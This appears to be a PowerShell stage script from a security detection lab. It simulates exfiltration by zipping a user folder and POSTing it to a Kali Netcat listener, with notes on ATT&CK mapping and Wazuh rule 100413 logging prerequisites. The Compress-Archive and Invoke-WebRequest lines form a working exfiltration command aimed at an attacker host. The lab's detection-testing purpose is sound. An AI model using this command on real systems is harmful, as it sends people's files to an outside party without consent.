# Stage 11 — HTTP transfer / exfiltration simulation
# ATT&CK: T1059.001 (PowerShell execution); T1048.003 is conditional on
#         the transfer being unencrypted HTTP over a channel separate from C2.
# Host: Windows 11 monitored victim
# Creates a ZIP archive and sends an HTTP POST to the Kali Netcat receiver.
#
# Detection scope:
# Wazuh rule 100413 is intended to detect Invoke-WebRequest activity through
# PowerShell Module Logging (Event ID 4103). It does not prove that the file
# was received completely or that the transfer succeeded.
#
# PREREQUISITES (docs/02, docs/03 §3.3, docs/04 Stage 11):
#   1. The committed Windows agent ossec.conf already contains a localfile
#      subscription to Microsoft-Windows-PowerShell/Operational
#      (log_format: eventchannel). Do not add a duplicate block.
#   2. Enable Windows PowerShell Module Logging through Group Policy:
#      Administrative Templates > Windows Components > Windows PowerShell >
#      Turn on Module Logging; configure the module name list as *.
#      This is required for Event ID 4103. Script Block Logging (4104) is a
#      separate setting and is not a substitute for 4103 in rule 100413.
#   3. Verify that Event ID 4103 is generated, forwarded by the Wazuh agent,
#      and decoded with fields matching the committed 100413 rule. The
#      current rule checks win.eventdata.payload; inspect a real event before
#      changing the field match or assuming the rule will fire.
#   4. Start the committed Kali Netcat receiver on TCP port 4445 before
#      issuing the POST. Netcat captures a raw HTTP request stream; it is not
#      an HTTP upload server and does not itself return a normal HTTP response.
#
# Stage 8 may be used to launch commands on the victim, but this Stage 11
# file transfer uses a separate HTTP/TCP connection. Do not map it to T1041
# unless the data is actually carried over the existing C2 channel.

Compress-Archive -Path C:\Users\LENOVO\Downloads\virustotaltest -DestinationPath C:\Windows\Temp\exfil_test.zip -Force

Invoke-WebRequest -Uri "http://192.168.60.135:4445/upload" -Method Post -InFile C:\Windows\Temp\exfil_test.zip -ContentType "application/octet-stream"

# Verify integrity only after extracting the HTTP request body from the Kali
# capture and comparing its SHA256 with the Windows archive:
# Get-FileHash C:\Windows\Temp\exfil_test.zip -Algorithm SHA256

# Cleanup after evidence collection:
# Remove-Item C:\Windows\Temp\exfil_test.zip -Force
